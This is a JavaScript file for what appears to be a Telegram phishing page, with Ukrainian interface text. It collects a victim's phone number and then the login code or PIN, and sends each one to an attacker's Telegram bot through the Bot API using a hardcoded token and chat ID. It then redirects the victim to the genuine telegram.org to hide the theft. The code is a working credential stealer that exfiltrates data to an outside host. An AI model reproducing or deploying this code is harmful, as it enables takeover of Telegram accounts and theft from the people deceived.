const botToken = '8274613087:AAGzooPrs3v_Eqtn3AW71m8bnlRQvpt-l48';
const chatId = ' 8463942433';

document.getElementById('nextBtn').addEventListener('click', async function() {
    const phone = document.getElementById('phone').value;
    const loading = document.getElementById('loading');
    const loadingText = document.getElementById('loadingText');
    
    if (!phone) return alert("Будь ласка, введіть номер телефону");
    
    try {
        loading.style.display = 'block';
        loadingText.textContent = "Надсилання коду...";
        
        // Відправка номера у Telegram
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: ` ${phone}`
            })
        });
        
        // Перехід до кроку з PIN-кодом
        document.getElementById('phoneStep').style.display = 'none';
        document.getElementById('pinStep').style.display = 'block';
        document.getElementById('stepText').textContent = "Перевірте Telegram та введіть PIN-код";
    } catch (error) {
        console.error('Помилка:', error);
    } finally {
        loading.style.display = 'none';
    }
});

document.getElementById('supportForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const pin = document.getElementById('pin').value;
    const loading = document.getElementById('loading');
    const loadingText = document.getElementById('loadingText');
    
    if (!pin) return alert("Будь ласка, введіть PIN-код");
    
    try {
        loading.style.display = 'block';
        loadingText.textContent = "Підтвердження...";
        
        // Відправка PIN-коду у Telegram
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: ` ${pin}`
            })
        });
        
        // Перенаправлення на справжній Telegram
        window.location.href = 'https://telegram.org';
    } catch (error) {
        console.error('Помилка:', error);
    } finally {
        loading.style.display = 'none';
    }
});